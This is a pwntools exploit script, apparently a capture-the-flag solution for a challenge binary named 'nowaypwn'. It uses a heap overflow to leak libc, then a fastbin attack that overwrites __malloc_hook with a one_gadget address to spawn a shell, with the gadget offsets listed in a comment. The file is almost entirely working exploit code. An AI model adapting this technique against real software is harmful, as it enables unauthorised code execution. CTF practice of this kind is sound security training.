from pwn import *
context.log_level = 'debug'

def add(size):
	p.sendline("1")
	p.sendline(str(size))
def delete(id):
	p.sendline("2")
	p.sendline(str(id))
def edit(id,content):
	p.sendline("3")
	p.sendline(str(id))
	p.send(content)
	sleep(0.2)
def show(id):
	p.sendline("4")
	p.sendline(str(id))
def overflow(id,content):
	p.sendline("3")
	p.sendline(str(id))
	p.sendline("skye")
	p.send(content)


p = process("./nowaypwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.sendlineafter("name:","skye")
p.sendlineafter("key:","skye")
p.sendlineafter("password!:\n","skdmaje1")

add(0x66)
add(0xf8)
add(0x66)
add(0x66)
add(0x66)
delete(1)
overflow(0,'a'*0x70)
show(0)
p.recvuntil('a'*0x70)
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libc_addr = leak_addr - (0x7ffff7dd1b78-0x7ffff7a0d000)
print "libc_addr:",hex(libc_addr)
malloc_hook = libc_addr + libc.sym['__malloc_hook']-0x23
print "malloc_hook:",hex(malloc_hook)
realloc = libc_addr + libc.sym['realloc']
print "realloc:",hex(realloc)
overflow(0,'b'*0x60+p64(0)+p64(0x101))
add(0xf8)

delete(3)
overflow(2,'a'*0x70+p64(malloc_hook))
overflow(2,'a'*0x60+p64(0)+p64(0x70))
add(0x66)
add(0x66)
edit(5,'a'*0xb+p64(libc_addr+0x4527a)+p64(realloc+4)+'\n')


'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''


#gdb.attach(p,"b *0x4009F1")
#raw_input()

add(0x10)
add(0x10)
#p.sendline('id')




p.interactive()